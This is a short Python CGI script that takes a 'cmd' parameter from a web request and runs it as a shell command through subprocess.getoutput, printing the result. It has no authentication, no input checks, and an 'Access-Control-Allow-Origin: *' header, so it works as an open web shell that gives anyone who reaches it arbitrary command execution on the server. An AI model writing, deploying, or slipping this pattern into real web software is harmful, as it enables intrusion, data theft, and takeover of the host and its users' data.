#!/usr/bin/python3
import cgi
import subprocess as sp

print("content-type: text/html")
print("Access-Control-Allow-Origin: *")
print()

y=cgi.FieldStorage()
cmd=y.getvalue('cmd')
x=sp.getoutput(cmd)
print(x)
